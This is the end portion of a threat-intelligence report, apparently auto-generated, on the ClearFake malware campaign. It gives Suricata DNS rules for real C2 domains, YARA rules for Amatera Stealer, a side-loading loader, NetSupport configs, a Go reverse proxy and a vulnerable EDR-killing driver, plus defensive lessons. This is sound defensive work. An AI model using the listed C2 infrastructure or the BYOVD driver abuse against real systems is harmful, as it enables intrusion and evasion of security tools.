alert udp $HOME_NET any -> any 53 (msg:"Actioner - ClearFake Go Reverse Proxy C2 Domain DNS Query (dubbedmuch.cc)"; flow:to_server; content:"|0a|dubbedmuch|02|cc|00|", nocase, fast_pattern; classtype:trojan-activity; reference:url,blog.talosintelligence.com/clearfake-webdav-infection-chain/; metadata:author Actioner, created 2026-09-10; sid:2100202; rev:1;)

alert udp $HOME_NET any -> any 53 (msg:"Actioner - ClearFake NetSupport Gateway Domain DNS Query (paternal-angrily.com)"; flow:to_server; content:"|08|paternal|07|angrily|03|com|00|", nocase, fast_pattern; classtype:trojan-activity; reference:url,blog.talosintelligence.com/clearfake-webdav-infection-chain/; metadata:author Actioner, created 2026-09-10; sid:2100203; rev:1;)

alert udp $HOME_NET any -> any 53 (msg:"Actioner - ClearFake Amatera Payload Domain DNS Query (cedar2glanz.ru)"; flow:to_server; content:"|0b|cedar2glanz|02|ru|00|", nocase, fast_pattern; classtype:trojan-activity; reference:url,blog.talosintelligence.com/clearfake-webdav-infection-chain/; metadata:author Actioner, created 2026-09-10; sid:2100204; rev:1;)
```

### YARA Rules

#### 18. Amatera Stealer Configuration Artifacts

Detects Amatera Stealer via its XOR decryption key, dead-drop resolver patterns, and exported function names.

<!-- audit: yarac yara_clearfake.yar /dev/null: exit 0. All 5 YARA rules compiled as a single file. PE header check + filesize constraint + string-based detection. -->

**Status:** Compiled (yarac exit 0) | Confidence: medium

```yara
import "pe"

rule Malware_Amatera_Stealer_Config : ClearFake
{
    meta:
        description = "Detects Amatera Stealer configuration artifacts including the XOR key, dead-drop resolver pattern, and GetEndpoints C2 command strings"
        author = "Actioner"
        date = "2026-09-10"
        reference = "https://blog.talosintelligence.com/clearfake-webdav-infection-chain/"
        severity = "high"
        tlp = "WHITE"

    strings:
        $xor_key = "852149723" ascii
        $deadrop1 = "telegra.ph" ascii wide
        $deadrop2 = "GetEndpoints" ascii wide
        $ver = "4.1.5-alpha" ascii
        $cfg1 = "moor" ascii fullword
        $cfg2 = "CfgInspectModuleData" ascii fullword

    condition:
        uint16(0) == 0x5A4D and
        filesize < 10MB and
        ($xor_key or $ver or (1 of ($deadrop*) and 1 of ($cfg*)))
}
```

#### 19. NativeAOT DLL Side-Loading Loader

Detects the NativeAOT loader DLL (secur32.dll) used for DLL side-loading via Chrome components.

<!-- audit: yarac exit 0. Targets PE files with both the side-loading host name and process injection API imports. -->

**Status:** Compiled (yarac exit 0) | Confidence: medium

```yara
import "pe"

rule Malware_ClearFake_NativeAOT_Loader : ClearFake
{
    meta:
        description = "Detects the NativeAOT loader DLL (secur32.dll) used in the ClearFake campaign for DLL side-loading via Chrome components, targeting process injection into explorer.exe"
        author = "Actioner"
        date = "2026-09-10"
        reference = "https://blog.talosintelligence.com/clearfake-webdav-infection-chain/"
        hash = "279d04c0cfd700c8bcb9acbed528131d3ffef8e25d12713e8649772739aecb92"
        severity = "high"
        tlp = "WHITE"

    strings:
        $s1 = "platform_experience_helper" ascii wide
        $s2 = "secur32" ascii wide
        $api1 = "VirtualAllocEx" ascii fullword
        $api2 = "WriteProcessMemory" ascii fullword
        $api3 = "NtCreateThreadEx" ascii fullword
        $api4 = "ZwTerminateProcess" ascii fullword

    condition:
        uint16(0) == 0x5A4D and
        filesize < 5MB and
        (1 of ($s*) and 2 of ($api*))
}
```

#### 20. NetSupport Manager ClearFake Configuration

Detects the campaign-specific NetSupport Manager configuration with license serial NSM789508 and associated gateway.

<!-- audit: yarac exit 0. Matches configuration files (not PE) so no MZ header check. Requires both license identifiers and a gateway indicator. -->

**Status:** Compiled (yarac exit 0) | Confidence: high (IOC-specific)

```yara
rule Malware_NetSupport_ClearFake_Config : ClearFake
{
    meta:
        description = "Detects the NetSupport Manager configuration file (client32.ini) with the specific license serial and gateway used in the ClearFake campaign"
        author = "Actioner"
        date = "2026-09-10"
        reference = "https://blog.talosintelligence.com/clearfake-webdav-infection-chain/"
        hash = "bd36f4c15fe0acb6748da5ed12e45dcc37d412385812c078d1e4f04730e9f69b"
        severity = "high"
        tlp = "WHITE"

    strings:
        $serial = "NSM789508" ascii wide nocase
        $license = "KAKAN" ascii wide nocase
        $gw1 = "paternal-angrily.com" ascii wide
        $gw2 = "212.118.56.166" ascii

    condition:
        filesize < 100KB and
        ($serial or $license) and
        (1 of ($gw*))
}
```

#### 21. Go Reverse Proxy Binary

Detects the Go reverse proxy binary by its module path and C2 infrastructure strings.

<!-- audit: yarac exit 0. No PE header check because Go binaries may have non-standard headers. Module path string is highly specific to this campaign. -->

**Status:** Compiled (yarac exit 0) | Confidence: high (IOC-specific)

```yara
rule Malware_GoReverseProxy_ClearFake : ClearFake
{
    meta:
        description = "Detects the Go reverse proxy binary from the ClearFake campaign that uses Yamux multiplexing over WebSocket Secure for bidirectional traffic relay"
        author = "Actioner"
        date = "2026-09-10"
        reference = "https://blog.talosintelligence.com/clearfake-webdav-infection-chain/"
        hash = "1819827e17f31e72d456158b6b9c90af25a65945f6f05d04a060da9f24179b25"
        severity = "high"
        tlp = "WHITE"

    strings:
        $pkg = "github.com/acr/proxy-panel/cmd/bot" ascii
        $yamux = "hashicorp/yamux" ascii
        $c2 = "dubbedmuch.cc" ascii

    condition:
        filesize < 20MB and
        ($pkg or ($yamux and $c2))
}
```

#### 22. DCRCVDrv BYOVD Driver

Detects the vulnerable DCRCVDrv.sys driver by its device name and vendor strings.

<!-- audit: yarac exit 0. PE header check + device string + vendor string. The device name \\Device\\DCRCVDRV_U is unique to this driver family. -->

**Status:** Compiled (yarac exit 0) | Confidence: high

```yara
rule Malware_DCRCVDrv_BYOVD : ClearFake
{
    meta:
        description = "Detects the vulnerable DCRCVDrv.sys driver abused for BYOVD EDR termination in the ClearFake campaign via IOCTL 0x2205c0"
        author = "Actioner"
        date = "2026-09-10"
        reference = "https://blog.talosintelligence.com/clearfake-webdav-infection-chain/"
        severity = "critical"
        tlp = "WHITE"

    strings:
        $dev = "\\Device\\DCRCVDRV_U" wide
        $vendor1 = "MOCOMSYS" ascii wide
        $vendor2 = "DCRCV_U Driver" ascii wide

    condition:
        uint16(0) == 0x5A4D and
        filesize < 1MB and
        $dev and 1 of ($vendor*)
}
```

## Lessons Learned

1. **Blockchain as hostile infrastructure is maturing.** The use of BNB Smart Chain contracts for both initial payload delivery (EtherHiding) and dynamic C2 resolution (ZigCryptoStealer) demonstrates that threat actors are treating blockchain as a reliable, takedown-resistant hosting platform. Defenders need monitoring capabilities for blockchain RPC endpoint queries from endpoints.

2. **ClickFix social engineering defeats traditional email-based defenses.** By compromising legitimate websites and using the Windows Run dialog as the execution vector, this campaign entirely bypasses email security gateways, attachment sandboxing, and URL rewriting. The defense must shift to endpoint controls: restricting `pushd` to external WebDAV shares, monitoring `rundll32` ordinal invocations, and implementing application whitelisting.

3. **BYOVD remains an effective EDR killer.** The DCRCVDrv.sys driver's IOCTL handler lacks any authorization checks, allowing any process to terminate arbitrary processes at kernel level. Organizations should proactively deploy driver blocklists (WDAC, Microsoft's recommended driver block rules) rather than relying on reactive detection of driver loading.

4. **Multi-payload deployment dilutes investigator focus.** By delivering five distinct tools (Amatera, ZigCryptoStealer, DCRCVDrv, Go proxy, and NetSupport) through a single initial access chain, the campaign ensures that even partial detection and remediation may leave active footholds. Incident response must account for all branches of the infection chain, not just the first artifact found.

## Sources

- [Cisco Talos - ClearFake WebDAV Infection Chain](https://blog.talosintelligence.com/clearfake-webdav-infection-chain/) -- primary technical analysis covering full infection chain, IOCs, and attribution

---
*Report generated by Actioner*
